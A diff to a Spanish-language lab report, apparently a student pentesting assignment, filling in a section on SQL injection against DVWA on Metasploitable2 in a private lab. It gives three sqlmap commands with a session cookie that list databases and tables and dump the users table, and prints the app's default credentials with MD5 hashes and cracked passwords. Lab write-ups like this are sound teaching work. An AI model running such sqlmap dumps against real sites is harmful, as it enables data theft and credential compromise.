@@ -229,23 +229,126 @@ Se obtuvo acceso total a Metasploitable2 con privilegios de superusuario (\textt
 
 \subsection{Descripción de la vulnerabilidad}
 
-% TODO: completar tras realizar la tarea
+La inyección SQL (\textit{SQL Injection}) es una vulnerabilidad de seguridad que permite a un atacante interferir con las consultas que una aplicación web realiza a su base de datos. Se produce cuando la entrada del usuario se incorpora directamente en una consulta SQL sin el debido saneamiento, permitiendo manipular la lógica de la consulta.
+
+En DVWA con nivel de seguridad \textit{Low}, el parámetro \texttt{id} del módulo SQL Injection se concatena directamente en la consulta SQL sin ningún tipo de validación ni uso de consultas parametrizadas, lo que lo hace completamente vulnerable a este tipo de ataque.
 
 \subsection{Herramientas utilizadas}
 
-% TODO: completar tras realizar la tarea
+\begin{itemize}
+  \item \textbf{DVWA} (\textit{Damn Vulnerable Web Application}): Aplicación web deliberadamente vulnerable que corre sobre el servidor Apache de Metasploitable2. Provee el módulo SQL Injection con distintos niveles de dificultad configurables.
+  \item \textbf{sqlmap}: Herramienta de código abierto que automatiza la detección y explotación de vulnerabilidades de inyección SQL. Soporta múltiples técnicas de inyección (boolean-based blind, error-based, time-based blind, UNION query) y permite enumerar bases de datos, tablas, columnas y volcar su contenido.
+\end{itemize}
 
 \subsection{Pasos realizados}
 
-% TODO: completar tras realizar la tarea
+\subsubsection{Configuración del nivel de seguridad en DVWA}
+
+Se accedió a DVWA en \texttt{http://192.168.128.2/dvwa} con las credenciales \texttt{admin} / \texttt{password}. En la sección \textbf{DVWA Security} se configuró el nivel en \textbf{Low} para exponer la vulnerabilidad sin mitigaciones.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../img/tarea2/t2_dvwa_login_kali.png}
+  \caption{\textit{Página de login de DVWA accedida desde Kali Linux.}}
+\end{figure}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../img/tarea2/t2_dvwa_home_kali.png}
+  \caption{\textit{Página principal de DVWA tras autenticación exitosa como administrador.}}
+\end{figure}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../img/tarea2/t2_dvwa_security_low_kali.png}
+  \caption{\textit{Configuración del nivel de seguridad de DVWA en Low.}}
+\end{figure}
+
+\subsubsection{Enumeración de bases de datos}
+
+Se obtuvo la cookie de sesión activa (\texttt{PHPSESSID}) desde las herramientas de desarrollo del navegador y se ejecutó sqlmap con el parámetro \texttt{--dbs} para listar todas las bases de datos disponibles en el servidor:
+
+\begin{lstlisting}[language=bash, caption={Enumeración de bases de datos con sqlmap}]
+sqlmap -u "http://192.168.128.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=2a49559df66e6500ecdcd56ad8df31c2; security=low" \
+  --dbs --batch
+\end{lstlisting}
+
+sqlmap identificó el parámetro \texttt{id} como vulnerable mediante cuatro técnicas de inyección distintas y enumeró 7 bases de datos en el servidor.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../img/tarea2/t2_dvwa_sqlmap_dbs_kali.png}
+  \caption{\textit{Resultado de sqlmap mostrando las 7 bases de datos encontradas en el servidor MySQL de Metasploitable2.}}
+\end{figure}
+
+\subsubsection{Enumeración de tablas en la base de datos dvwa}
+
+Se enumeraron las tablas de la base de datos \texttt{dvwa} con el parámetro \texttt{--tables}:
+
+\begin{lstlisting}[language=bash, caption={Enumeración de tablas de la base de datos dvwa}]
+sqlmap -u "http://192.168.128.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=2a49559df66e6500ecdcd56ad8df31c2; security=low" \
+  -D dvwa --tables --batch
+\end{lstlisting}
+
+La base de datos \texttt{dvwa} contiene dos tablas: \texttt{guestbook} y \texttt{users}.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../img/tarea2/t2_dvwa_sql_tables_kali.png}
+  \caption{\textit{Tablas encontradas en la base de datos dvwa: guestbook y users.}}
+\end{figure}
+
+\subsubsection{Volcado de la tabla users}
+
+Se volcó el contenido completo de la tabla \texttt{users} con el parámetro \texttt{--dump}:
+
+\begin{lstlisting}[language=bash, caption={Volcado de la tabla users de la base de datos dvwa}]
+sqlmap -u "http://192.168.128.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=2a49559df66e6500ecdcd56ad8df31c2; security=low" \
+  -D dvwa -T users --dump --batch
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../img/tarea2/t2_dvwa_user_tables_kali.png}
+  \caption{\textit{Volcado completo de la tabla users con credenciales y hashes MD5 crackeados.}}
+\end{figure}
 
 \subsection{Funcionamiento del ataque}
 
-% TODO: completar tras realizar la tarea
+El ataque de inyección SQL sigue el siguiente flujo:
+
+\begin{enumerate}
+  \item \textbf{Identificación del punto de inyección}: sqlmap envía payloads de prueba al parámetro \texttt{id} de la URL y analiza las respuestas para detectar comportamientos anómalos que delaten una vulnerabilidad SQL.
+  \item \textbf{Confirmación de la técnica}: Se identificaron cuatro técnicas de inyección aplicables: boolean-based blind, error-based (FLOOR), time-based blind (SLEEP) y UNION query de 2 columnas.
+  \item \textbf{Enumeración}: Aprovechando la técnica UNION query, sqlmap extrae los nombres de bases de datos, tablas y columnas del servidor MySQL directamente desde las tablas del sistema (\texttt{information\_schema}).
+  \item \textbf{Exfiltración de datos}: Se vuelca el contenido de la tabla \texttt{users}, obteniendo nombres de usuario, hashes MD5 de contraseñas y otros campos.
+  \item \textbf{Cracking de hashes}: sqlmap identifica automáticamente el algoritmo MD5 y aplica un ataque de diccionario, recuperando las contraseñas en texto plano.
+\end{enumerate}
 
 \subsection{Resultado}
 
-% TODO: completar tras realizar la tarea
+Se obtuvo el volcado completo de la tabla \texttt{users} de la base de datos \texttt{dvwa}, con las credenciales de los 5 usuarios registrados:
+
+\begin{table}[H]
+  \centering
+  \caption{\textit{Credenciales extraídas de la tabla users de DVWA}}
+  \begin{tabular}{@{}lll@{}}
+    \toprule
+    \textbf{Usuario} & \textbf{Hash MD5} & \textbf{Contraseña} \\
+    \midrule
+    admin   & 5f4dcc3b5aa765d61d8327deb882cf99 & password \\
+    gordonb & e99a18c428cb38d5f260853678922e03 & abc123   \\
+    1337    & 8d3533d75ae2c3966d7e0d4fcc69216b & charley  \\
+    pablo   & 0d107d09f5bbe40cade3de5c71e9e9b7 & letmein  \\
+    smithy  & 5f4dcc3b5aa765d61d8327deb882cf99 & password \\
+    \bottomrule
+  \end{tabular}
+\end{table}
+
+Además, se identificaron 6 bases de datos adicionales en el servidor (\texttt{information\_schema}, \texttt{metasploit}, \texttt{mysql}, \texttt{owasp10}, \texttt{tikiwiki}, \texttt{tikiwiki195}), evidenciando el alcance total del acceso obtenido mediante la inyección SQL.
 
 % ==========================================================
 \section{Tarea 3: Command Execution en DVWA}
